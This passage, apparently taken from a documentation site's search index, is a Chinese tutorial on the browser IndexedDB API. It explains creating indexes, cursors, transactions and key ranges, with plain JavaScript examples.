\u662f\u5f02\u6b65\u65b9\u6cd5\uff0c\u8bfb\u53d6\u6210\u529f\u4ee5\u540e\uff0c\u53ea\u80fd\u5728 success \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e2d\u5904\u7406\u6570\u636e\u3002 \uff0811\uff09IDBObjectStore.createIndex() IDBObjectStore.createIndex() \u65b9\u6cd5\u7528\u4e8e\u65b0\u5efa\u5f53\u524d\u6570\u636e\u5e93\u7684\u4e00\u4e2a\u7d22\u5f15\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 VersionChange \u76d1\u542c\u51fd\u6570\u91cc\u9762\u8c03\u7528\u3002 1 objectStore . createIndex ( indexName , keyPath , objectParameters ) \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 indexName\uff1a\u7d22\u5f15\u540d keyPath\uff1a\u4e3b\u952e objectParameters\uff1a\u914d\u7f6e\u5bf9\u8c61\uff08\u53ef\u9009\uff09 \u7b2c\u4e09\u4e2a\u53c2\u6570\u53ef\u4ee5\u914d\u7f6e\u4ee5\u4e0b\u5c5e\u6027\u3002 unique\uff1a\u5982\u679c\u8bbe\u4e3a true \uff0c\u5c06\u4e0d\u5141\u8bb8\u91cd\u590d\u7684\u503c multiEntry\uff1a\u5982\u679c\u8bbe\u4e3a true \uff0c\u5bf9\u4e8e\u6709\u591a\u4e2a\u503c\u7684\u4e3b\u952e\u6570\u7ec4\uff0c\u6bcf\u4e2a\u503c\u5c06\u5728\u7d22\u5f15\u91cc\u9762\u65b0\u5efa\u4e00\u4e2a\u6761\u76ee\uff0c\u5426\u5219\u4e3b\u952e\u6570\u7ec4\u5bf9\u5e94\u4e00\u4e2a\u6761\u76ee\u3002 \u5047\u5b9a\u5bf9\u8c61\u4ed3\u5e93\u4e2d\u7684\u6570\u636e\u8bb0\u5f55\u90fd\u662f\u5982\u4e0b\u7684 person \u7c7b\u578b\u3002 1 2 3 4 5 var person = { name : name , email : email , created : new Date () }; \u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u6765\u5efa\u7acb\u7d22\u5f15\u3002 1 2 3 4 var store = db . createObjectStore ( 'people' , { autoIncrement : true }); store . createIndex ( 'name' , 'name' , { unique : false }); store . createIndex ( 'email' , 'email' , { unique : true }); \u4e0a\u9762\u4ee3\u7801\u544a\u8bc9\u7d22\u5f15\u5bf9\u8c61\uff0c name \u5c5e\u6027\u4e0d\u662f\u552f\u4e00\u503c\uff0c email \u5c5e\u6027\u662f\u552f\u4e00\u503c\u3002 \uff0812\uff09IDBObjectStore.deleteIndex() IDBObjectStore.deleteIndex() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6307\u5b9a\u7684\u7d22\u5f15\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 VersionChange \u76d1\u542c\u51fd\u6570\u91cc\u9762\u8c03\u7528\u3002 1 objectStore . deleteIndex ( indexName ) \uff0813\uff09IDBObjectStore.openCursor() IDBObjectStore.openCursor() \u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u6307\u9488\u5bf9\u8c61\u3002 1 IDBObjectStore . openCursor () \u6307\u9488\u5bf9\u8c61\u53ef\u4ee5\u7528\u6765\u904d\u5386\u6570\u636e\u3002\u8be5\u5bf9\u8c61\u4e5f\u662f\u5f02\u6b65\u7684\uff0c\u6709\u81ea\u5df1\u7684 success \u548c error \u4e8b\u4ef6\uff0c\u53ef\u4ee5\u5bf9\u5b83\u4eec\u6307\u5b9a\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var t = db . transaction ([ 'test' ], 'readonly' ); var store = t . objectStore ( 'test' ); var cursor = store . openCursor (); cursor . onsuccess = function ( event ) { var res = event . target . result ; if ( res ) { console . log ( 'Key' , res . key ); console . dir ( 'Data' , res . value ); res . continue (); } } \u76d1\u542c\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be5\u5bf9\u8c61\u7684 target.result \u5c5e\u6027\u6307\u5411\u5f53\u524d\u6570\u636e\u8bb0\u5f55\u3002\u8be5\u8bb0\u5f55\u7684 key \u548c value \u5206\u522b\u8fd4\u56de\u4e3b\u952e\u548c\u952e\u503c\uff08\u5373\u5b9e\u9645\u5b58\u5165\u7684\u6570\u636e\uff09\u3002 continue() \u65b9\u6cd5\u5c06\u5149\u6807\u79fb\u5230\u4e0b\u4e00\u4e2a\u6570\u636e\u5bf9\u8c61\uff0c\u5982\u679c\u5f53\u524d\u6570\u636e\u5bf9\u8c61\u5df2\u7ecf\u662f\u6700\u540e\u4e00\u4e2a\u6570\u636e\u4e86\uff0c\u5219\u5149\u6807\u6307\u5411 null \u3002 openCursor() \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e3b\u952e\u503c\uff0c\u6216\u8005\u4e00\u4e2a IDBKeyRange \u5bf9\u8c61\u3002\u5982\u679c\u6307\u5b9a\u8be5\u53c2\u6570\uff0c\u5c06\u53ea\u5904\u7406\u5305\u542b\u6307\u5b9a\u4e3b\u952e\u7684\u8bb0\u5f55\uff1b\u5982\u679c\u7701\u7565\uff0c\u5c06\u5904\u7406\u6240\u6709\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u904d\u5386\u65b9\u5411\uff0c\u9ed8\u8ba4\u503c\u4e3a next \uff0c\u5176\u4ed6\u53ef\u80fd\u7684\u503c\u4e3a prev \u3001 nextunique \u548c prevunique \u3002\u540e\u4e24\u4e2a\u503c\u8868\u793a\u5982\u679c\u9047\u5230\u91cd\u590d\u503c\uff0c\u4f1a\u81ea\u52a8\u8df3\u8fc7\u3002 \uff0814\uff09IDBObjectStore.openKeyCursor() IDBObjectStore.openKeyCursor() \u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u4e3b\u952e\u6307\u9488\u5bf9\u8c61\u3002 1 IDBObjectStore . openKeyCursor () IDBTransaction \u5bf9\u8c61 \u00b6 IDBTransaction \u5bf9\u8c61\u7528\u6765\u5f02\u6b65\u64cd\u4f5c\u6570\u636e\u5e93\u4e8b\u52a1\uff0c\u6240\u6709\u7684\u8bfb\u5199\u64cd\u4f5c\u90fd\u8981\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u8fdb\u884c\u3002 IDBDatabase.transaction() \u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u4e00\u4e2a IDBTransaction \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var db ; var DBOpenRequest = window . indexedDB . open ( 'demo' , 1 ); DBOpenRequest . onsuccess = function ( event ) { db = DBOpenRequest . result ; var transaction = db . transaction ([ 'demo' ], 'readwrite' ); transaction . oncomplete = function ( event ) { console . log ( 'transaction success' ); }; transaction . onerror = function ( event ) { console . log ( 'transaction error: ' + transaction . error ); }; var objectStore = transaction . objectStore ( 'demo' ); var objectStoreRequest = objectStore . add ({ foo : 1 }); objectStoreRequest . onsuccess = function ( event ) { console . log ( 'add data success' ); }; }; \u4e8b\u52a1\u7684\u6267\u884c\u987a\u5e8f\u662f\u6309\u7167\u521b\u5efa\u7684\u987a\u5e8f\uff0c\u800c\u4e0d\u662f\u53d1\u51fa\u8bf7\u6c42\u7684\u987a\u5e8f\u3002 1 2 3 4 5 6 var trans1 = db . transaction ( 'foo' , 'readwrite' ); var trans2 = db . transaction ( 'foo' , 'readwrite' ); var objectStore2 = trans2 . objectStore ( 'foo' ) var objectStore1 = trans1 . objectStore ( 'foo' ) objectStore2 . put ( '2' , 'key' ); objectStore1 . put ( '1' , 'key' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c key \u5bf9\u5e94\u7684\u952e\u503c\u6700\u7ec8\u662f 2 \uff0c\u800c\u4e0d\u662f 1 \u3002\u56e0\u4e3a\u4e8b\u52a1 trans1 \u5148\u4e8e trans2 \u521b\u5efa\uff0c\u6240\u4ee5\u9996\u5148\u6267\u884c\u3002 \u6ce8\u610f\uff0c\u4e8b\u52a1\u6709\u53ef\u80fd\u5931\u8d25\uff0c\u53ea\u6709\u76d1\u542c\u5230\u4e8b\u52a1\u7684 complete \u4e8b\u4ef6\uff0c\u624d\u80fd\u4fdd\u8bc1\u4e8b\u52a1\u64cd\u4f5c\u6210\u529f\u3002 IDBTransaction \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBTransaction.db \uff1a\u8fd4\u56de\u5f53\u524d\u4e8b\u52a1\u6240\u5728\u7684\u6570\u636e\u5e93\u5bf9\u8c61 IDBDatabase\u3002 IDBTransaction.error \uff1a\u8fd4\u56de\u5f53\u524d\u4e8b\u52a1\u7684\u9519\u8bef\u3002\u5982\u679c\u4e8b\u52a1\u6ca1\u6709\u7ed3\u675f\uff0c\u6216\u8005\u4e8b\u52a1\u6210\u529f\u7ed3\u675f\uff0c\u6216\u8005\u88ab\u624b\u52a8\u7ec8\u6b62\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de null \u3002 IDBTransaction.mode \uff1a\u8fd4\u56de\u5f53\u524d\u4e8b\u52a1\u7684\u6a21\u5f0f\uff0c\u9ed8\u8ba4\u662f readonly \uff08\u53ea\u8bfb\uff09\uff0c\u53e6\u4e00\u4e2a\u503c\u662f readwrite \u3002 IDBTransaction.objectStoreNames \uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61 DOMStringList\uff0c\u6210\u5458\u662f\u5f53\u524d\u4e8b\u52a1\u6d89\u53ca\u7684\u5bf9\u8c61\u4ed3\u5e93\u7684\u540d\u5b57\u3002 IDBTransaction.onabort \uff1a\u6307\u5b9a abort \u4e8b\u4ef6\uff08\u4e8b\u52a1\u4e2d\u65ad\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBTransaction.oncomplete \uff1a\u6307\u5b9a complete \u4e8b\u4ef6\uff08\u4e8b\u52a1\u6210\u529f\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBTransaction.onerror \uff1a\u6307\u5b9a error \u4e8b\u4ef6\uff08\u4e8b\u52a1\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBTransaction \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\u3002 IDBTransaction.abort() \uff1a\u7ec8\u6b62\u5f53\u524d\u4e8b\u52a1\uff0c\u56de\u6eda\u6240\u6709\u5df2\u7ecf\u8fdb\u884c\u7684\u53d8\u66f4\u3002 IDBTransaction.objectStore(name) \uff1a\u8fd4\u56de\u6307\u5b9a\u540d\u79f0\u7684\u5bf9\u8c61\u4ed3\u5e93 IDBObjectStore\u3002 IDBIndex \u5bf9\u8c61 \u00b6 IDBIndex \u5bf9\u8c61\u4ee3\u8868\u6570\u636e\u5e93\u7684\u7d22\u5f15\uff0c\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u83b7\u53d6\u6570\u636e\u5e93\u91cc\u9762\u7684\u8bb0\u5f55\u3002\u6570\u636e\u8bb0\u5f55\u7684\u4e3b\u952e\u9ed8\u8ba4\u5c31\u662f\u5e26\u6709\u7d22\u5f15\uff0cIDBIndex \u5bf9\u8c61\u4e3b\u8981\u7528\u4e8e\u901a\u8fc7\u9664\u4e3b\u952e\u4ee5\u5916\u7684\u5176\u4ed6\u952e\uff0c\u5efa\u7acb\u7d22\u5f15\u83b7\u53d6\u5bf9\u8c61\u3002 IDBIndex \u662f\u6301\u4e45\u6027\u7684\u952e\u503c\u5bf9\u5b58\u50a8\u3002\u53ea\u8981\u63d2\u5165\u3001\u66f4\u65b0\u6216\u5220\u9664\u6570\u636e\u8bb0\u5f55\uff0c\u5f15\u7528\u7684\u5bf9\u8c61\u5e93\u4e2d\u7684\u8bb0\u5f55\uff0c\u7d22\u5f15\u5c31\u4f1a\u81ea\u52a8\u66f4\u65b0\u3002 IDBObjectStore.index() \u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6 IDBIndex \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var transaction = db . transaction ([ 'contactsList' ], 'readonly' ); var objectStore = transaction . objectStore ( 'contactsList' ); var myIndex = objectStore . index ( 'lName' ); myIndex . openCursor (). onsuccess = function ( event ) { var cursor = event . target . result ; if ( cursor ) { var tableRow = document . createElement ( 'tr' ); tableRow . innerHTML = '<td>' + cursor . value . id + '</td>' + '<td>' + cursor . value . lName + '</td>' + '<td>' + cursor . value . fName + '</td>' + '<td>' + cursor . value . jTitle + '</td>' + '<td>' + cursor . value . company + '</td>' + '<td>' + cursor . value . eMail + '</td>' + '<td>' + cursor . value . phone + '</td>' + '<td>' + cursor . value . age + '</td>' ; tableEntry . appendChild ( tableRow ); cursor . continue (); } else { console . log ( 'Entries all displayed.' ); } }; IDBIndex \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBIndex.name \uff1a\u5b57\u7b26\u4e32\uff0c\u7d22\u5f15\u7684\u540d\u79f0\u3002 IDBIndex.objectStore \uff1a\u7d22\u5f15\u6240\u5728\u7684\u5bf9\u8c61\u4ed3\u5e93\u3002 IDBIndex.keyPath \uff1a\u7d22\u5f15\u7684\u4e3b\u952e\u3002 IDBIndex.multiEntry \uff1a\u5e03\u5c14\u503c\uff0c\u9488\u5bf9 keyPath \u4e3a\u6570\u7ec4\u7684\u60c5\u51b5\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u521b\u5efa\u6570\u7ec4\u65f6\uff0c\u6bcf\u4e2a\u6570\u7ec4\u6210\u5458\u90fd\u4f1a\u6709\u4e00\u4e2a\u6761\u76ee\uff0c\u5426\u5219\u6bcf\u4e2a\u6570\u7ec4\u90fd\u53ea\u6709\u4e00\u4e2a\u6761\u76ee\u3002 IDBIndex.unique \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u521b\u5efa\u7d22\u5f15\u65f6\u662f\u5426\u5141\u8bb8\u76f8\u540c\u7684\u4e3b\u952e\u3002 IDBIndex \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\uff0c\u5b83\u4eec\u90fd\u662f\u5f02\u6b65\u7684\uff0c\u7acb\u5373\u8fd4\u56de\u7684\u90fd\u662f\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 IDBIndex.count() \uff1a\u7528\u6765\u83b7\u53d6\u8bb0\u5f55\u7684\u6570\u91cf\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e3b\u952e\u6216 IDBKeyRange \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd9\u65f6\u53ea\u8fd4\u56de\u7b26\u5408\u4e3b\u952e\u7684\u8bb0\u5f55\u6570\u91cf\uff0c\u5426\u5219\u8fd4\u56de\u6240\u6709\u8bb0\u5f55\u7684\u6570\u91cf\u3002 IDBIndex.get(key) \uff1a\u7528\u6765\u83b7\u53d6\u7b26\u5408\u6307\u5b9a\u4e3b\u952e\u7684\u6570\u636e\u8bb0\u5f55\u3002 IDBIndex.getKey(key) \uff1a\u7528\u6765\u83b7\u53d6\u6307\u5b9a\u7684\u4e3b\u952e\u3002 IDBIndex.getAll() \uff1a\u7528\u6765\u83b7\u53d6\u6240\u6709\u7684\u6570\u636e\u8bb0\u5f55\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u53ef\u9009\u7684\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u7528\u6765\u6307\u5b9a\u4e3b\u952e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7528\u6765\u6307\u5b9a\u8fd4\u56de\u8bb0\u5f55\u7684\u6570\u91cf\u3002\u5982\u679c\u7701\u7565\u8fd9\u4e24\u4e2a\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u6240\u6709\u8bb0\u5f55\u3002\u7531\u4e8e\u83b7\u53d6\u6210\u529f\u65f6\uff0c\u6d4f\u89c8\u5668\u5fc5\u987b\u751f\u6210\u6240\u6709\u5bf9\u8c61\uff0c\u6240\u4ee5\u5bf9\u6027\u80fd\u6709\u5f71\u54cd\u3002\u5982\u679c\u6570\u636e\u96c6\u6bd4\u8f83\u5927\uff0c\u5efa\u8bae\u4f7f\u7528 IDBCursor \u5bf9\u8c61\u3002 IDBIndex.getAllKeys() \uff1a\u8be5\u65b9\u6cd5\u4e0e IDBIndex.getAll() \u65b9\u6cd5\u76f8\u4f3c\uff0c\u533a\u522b\u662f\u83b7\u53d6\u6240\u6709\u4e3b\u952e\u3002 IDBIndex.openCursor() \uff1a\u7528\u6765\u83b7\u53d6\u4e00\u4e2a IDBCursor \u5bf9\u8c61\uff0c\u7528\u6765\u904d\u5386\u7d22\u5f15\u91cc\u9762\u7684\u6240\u6709\u6761\u76ee\u3002 IDBIndex.openKeyCursor() \uff1a\u8be5\u65b9\u6cd5\u4e0e IDBIndex.openCursor() \u65b9\u6cd5\u76f8\u4f3c\uff0c\u533a\u522b\u662f\u904d\u5386\u6240\u6709\u6761\u76ee\u7684\u4e3b\u952e\u3002 IDBCursor \u5bf9\u8c61 \u00b6 IDBCursor \u5bf9\u8c61\u4ee3\u8868\u6307\u9488\u5bf9\u8c61\uff0c\u7528\u6765\u904d\u5386\u6570\u636e\u4ed3\u5e93\uff08IDBObjectStore\uff09\u6216\u7d22\u5f15\uff08IDBIndex\uff09\u7684\u8bb0\u5f55\u3002 IDBCursor \u5bf9\u8c61\u4e00\u822c\u901a\u8fc7 IDBObjectStore.openCursor() \u65b9\u6cd5\u83b7\u5f97\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var transaction = db . transaction ([ 'rushAlbumList' ], 'readonly' ); var objectStore = transaction . objectStore ( 'rushAlbumList' ); objectStore . openCursor ( null , 'next' ). onsuccess = function ( event ) { var cursor = event . target . result ; if ( cursor ) { var listItem = document . createElement ( 'li' ); listItem . innerHTML = cursor . value . albumTitle + ', ' + cursor . value . year ; list . appendChild ( listItem ); console . log ( cursor . source ); cursor . continue (); } else { console . log ( 'Entries all displayed.' ); } }; IDBCursor \u5bf9\u8c61\u7684\u5c5e\u6027\u3002 IDBCursor.source \uff1a\u8fd4\u56de\u6b63\u5728\u904d\u5386\u7684\u5bf9\u8c61\u4ed3\u5e93\u6216\u7d22\u5f15\u3002 IDBCursor.direction \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6307\u9488\u904d\u5386\u7684\u65b9\u5411\u3002\u5171\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u503c\uff1anext\uff08\u4ece\u5934\u5f00\u59cb\u5411\u540e\u904d\u5386\uff09\u3001nextunique\uff08\u4ece\u5934\u5f00\u59cb\u5411\u540e\u904d\u5386\uff0c\u91cd\u590d\u7684\u503c\u53ea\u904d\u5386\u4e00\u6b21\uff09\u3001prev\uff08\u4ece\u5c3e\u90e8\u5f00\u59cb\u5411\u524d\u904d\u5386\uff09\u3001prevunique\uff08\u4ece\u5c3e\u90e8\u5f00\u59cb\u5411\u524d\u904d\u5386\uff0c\u91cd\u590d\u7684\u503c\u53ea\u904d\u5386\u4e00\u6b21\uff09\u3002\u8be5\u5c5e\u6027\u901a\u8fc7 IDBObjectStore.openCursor() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\uff0c\u4e00\u65e6\u6307\u5b9a\u5c31\u4e0d\u80fd\u6539\u53d8\u4e86\u3002 IDBCursor.key \uff1a\u8fd4\u56de\u5f53\u524d\u8bb0\u5f55\u7684\u4e3b\u952e\u3002 IDBCursor.value \uff1a\u8fd4\u56de\u5f53\u524d\u8bb0\u5f55\u7684\u6570\u636e\u503c\u3002 IDBCursor.primaryKey \uff1a\u8fd4\u56de\u5f53\u524d\u8bb0\u5f55\u7684\u4e3b\u952e\u3002\u5bf9\u4e8e\u6570\u636e\u4ed3\u5e93\uff08objectStore\uff09\u6765\u8bf4\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7b49\u540c\u4e8e IDBCursor.key\uff1b\u5bf9\u4e8e\u7d22\u5f15\uff0cIDBCursor.key \u8fd4\u56de\u7d22\u5f15\u7684\u4f4d\u7f6e\u503c\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de\u6570\u636e\u8bb0\u5f55\u7684\u4e3b\u952e\u3002 IDBCursor \u5bf9\u8c61\u6709\u5982\u4e0b\u65b9\u6cd5\u3002 IDBCursor.advance(n) \uff1a\u6307\u9488\u5411\u524d\u79fb\u52a8 n \u4e2a\u4f4d\u7f6e\u3002 IDBCursor.continue() \uff1a\u6307\u9488\u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u4f4d\u7f6e\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u4e3b\u952e\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd9\u65f6\u4f1a\u8df3\u8f6c\u5230\u8fd9\u4e2a\u4e3b\u952e\u3002 IDBCursor.continuePrimaryKey() \uff1a\u8be5\u65b9\u6cd5\u9700\u8981\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f key \uff0c\u7b2c\u4e8c\u4e2a\u662f primaryKey \uff0c\u5c06\u6307\u9488\u79fb\u5230\u7b26\u5408\u8fd9\u4e24\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u3002 IDBCursor.delete() \uff1a\u7528\u6765\u5220\u9664\u5f53\u524d\u4f4d\u7f6e\u7684\u8bb0\u5f55\uff0c\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u6539\u53d8\u6307\u9488\u7684\u4f4d\u7f6e\u3002 IDBCursor.update() \uff1a\u7528\u6765\u66f4\u65b0\u5f53\u524d\u4f4d\u7f6e\u7684\u8bb0\u5f55\uff0c\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u5b83\u7684\u53c2\u6570\u662f\u8981\u5199\u5165\u6570\u636e\u5e93\u7684\u65b0\u7684\u503c\u3002 IDBKeyRange \u5bf9\u8c61 \u00b6 IDBKeyRange \u5bf9\u8c61\u4ee3\u8868\u6570\u636e\u4ed3\u5e93\uff08object store\uff09\u91cc\u9762\u7684\u4e00\u7ec4\u4e3b\u952e\u3002\u6839\u636e\u8fd9\u7ec4\u4e3b\u952e\uff0c\u53ef\u4ee5\u83b7\u53d6\u6570\u636e\u4ed3\u5e93\u6216\u7d22\u5f15\u91cc\u9762\u7684\u4e00\u7ec4\u8bb0\u5f55\u3002 IDBKeyRange \u53ef\u4ee5\u53ea\u5305\u542b\u4e00\u4e2a\u503c\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e0a\u9650\u548c\u4e0b\u9650\u3002\u5b83\u6709\u56db\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u7528\u6765\u6307\u5b9a\u4e3b\u952e\u7684\u8303\u56f4\u3002 IDBKeyRange.lowerBound() \uff1a\u6307\u5b9a\u4e0b\u9650\u3002 IDBKeyRange.upperBound() \uff1a\u6307\u5b9a\u4e0a\u9650\u3002 IDBKeyRange.bound() \uff1a\u540c\u65f6\u6307\u5b9a\u4e0a\u4e0b\u9650\u3002 IDBKeyRange.only() \uff1a\u6307\u5b9a\u53ea\u5305\u542b\u4e00\u4e2a\u503c\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u4ee3\u7801\u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // All keys \u2264 x var r1 = IDBKeyRange . upperBound ( x ); // All keys < x var r2 = IDBKeyRange . upperBound ( x , true ); // All keys \u2265 y var r3 = IDBKeyRange . lowerBound ( y ); // All keys > y var r4 = IDBKeyRange . lowerBound ( y , true ); // All keys \u2265 x && \u2264 y var r5 = IDBKeyRange . bound ( x , y ); // All keys > x &&< y var r6 = IDBKeyRange . bound ( x , y , true , true ); // All keys > x && \u2264 y var r7 = IDBKeyRange . bound ( x , y , true , false ); // All keys \u2265 x &&< y var r8 = IDBKeyRange . bound ( x , y , false , true ); // The key = z var r9 = IDBKeyRange . only ( z ); IDBKeyRange.lowerBound() \u3001 IDBKeyRange.upperBound() \u3001 IDBKeyRange.bound() \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u9ed8\u8ba4\u5305\u62ec\u7aef\u70b9\u503c\uff0c\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u4fee\u6539\u8fd9\u4e2a\u5c5e\u6027\u3002 \u4e0e\u4e4b\u5bf9\u5e94\uff0cIDBKeyRange \u5bf9\u8c61\u6709\u56db\u4e2a\u53ea\u8bfb\u5c5e\u6027\u3002 IDBKeyRange.lower \uff1a\u8fd4\u56de\u4e0b\u9650 IDBKeyRange.lowerOpen \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e0b\u9650\u662f\u5426\u4e3a\u5f00\u533a\u95f4\uff08\u5373\u4e0b\u9650\u662f\u5426\u6392\u9664\u5728\u8303\u56f4\u4e4b\u5916\uff09 IDBKeyRange.upper \uff1a\u8fd4\u56de\u4e0a\u9650 IDBKeyRange.upperOpen \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e0a\u9650\u662f\u5426\u4e3a\u5f00\u533a\u95f4\uff08\u5373\u4e0a\u9650\u662f\u5426\u6392\u9664\u5728\u8303\u56f4\u4e4b\u5916\uff09 IDBKeyRange \u5b9e\u4f8b\u5bf9\u8c61\u751f\u6210\u4ee5\u540e\uff0c\u5c06\u5b83\u4f5c\u4e3a\u53c2\u6570\u8f93\u5165 IDBObjectStore \u6216 IDBIndex \u5bf9\u8c61\u7684 openCursor() \u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u5728\u6240\u8bbe\u5b9a\u7684\u8303\u56f4\u5185\u8bfb\u53d6\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var t = db . transaction ([ 'people' ], 'readonly' ); var store = t . objectStore ( 'people' ); var index = store . index ( 'name' ); var range = IDBKeyRange . bound ( 'B' , 'D' ); index . openCursor ( range ). onsuccess = function ( e ) { var cursor = e . target . result ; if ( cursor ) { console . log ( cursor . key + ':' ); for ( var field in cursor . value ) { console . log ( cursor . value [ field ]); } cursor . continue (); } } IDBKeyRange \u6709\u4e00\u4e2a\u5b9e\u4f8b\u65b9\u6cd5 includes(key) \uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67d0\u4e2a\u4e3b\u952e\u662f\u5426\u5305\u542b\u5728\u5f53\u524d\u8fd9\u4e2a\u4e3b\u952e\u7ec4\u4e4b\u5185\u3002 1 2 3 4 var keyRangeValue = IDBKeyRange . bound ( 'A' , 'K' , false , false ); keyRangeValue . includes ( 'F' ) // true keyRangeValue . includes ( 'W' ) // false \u53c2\u8003\u94fe\u63a5 \u00b6 Raymond Camden, Working With IndexedDB \u2013 Part 1 Raymond Camden, Working With IndexedDB \u2013 Part 2 Raymond Camden, Working With IndexedDB - Part 3 Tiffany Brown, An Introduction to IndexedDB David Fahlander, Breaking the Borders of IndexedDB TutorialsPoint, HTML5 - IndexedDB","title":"IndexedDB API"},{"location":"bom/indexeddb/#indexeddb-api","text":"","title":"IndexedDB API"},{"location":"bom/indexeddb/#_1","text":"\u968f\u7740\u6d4f\u89c8\u5668\u7684\u529f\u80fd\u4e0d\u65ad\u589e\u5f3a\uff0c\u8d8a\u6765\u8d8a\u591a\u7684\u7f51\u7ad9\u5f00\u59cb\u8003\u8651\uff0c\u5c06\u5927\u91cf\u6570\u636e\u50a8\u5b58\u5728\u5ba2\u6237\u7aef\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u4ece\u670d\u52a1\u5668\u83b7\u53d6\u6570\u636e\uff0c\u76f4\u63a5\u4ece\u672c\u5730\u83b7\u53d6\u6570\u636e\u3002 \u73b0\u6709\u7684\u6d4f\u89c8\u5668\u6570\u636e\u50a8\u5b58\u65b9\u6848\uff0c\u90fd\u4e0d\u9002\u5408\u50a8\u5b58\u5927\u91cf\u6570\u636e\uff1aCookie \u7684\u5927\u5c0f\u4e0d\u8d85\u8fc7 4KB\uff0c\u4e14\u6bcf\u6b21\u8bf7\u6c42\u90fd\u4f1a\u53d1\u9001\u56de\u670d\u52a1\u5668\uff1bLocalStorage \u5728 2.5MB \u5230 10MB \u4e4b\u95f4\uff08\u5404\u5bb6\u6d4f\u89c8\u5668\u4e0d\u540c\uff09\uff0c\u800c\u4e14\u4e0d\u63d0\u4f9b\u641c\u7d22\u529f\u80fd\uff0c\u4e0d\u80fd\u5efa\u7acb\u81ea\u5b9a\u4e49\u7684\u7d22\u5f15\u3002\u6240\u4ee5\uff0c\u9700\u8981\u4e00\u79cd\u65b0\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u8fd9\u5c31\u662f IndexedDB \u8bde\u751f\u7684\u80cc\u666f\u3002 \u901a\u4fd7\u5730\u8bf4\uff0cIndexedDB 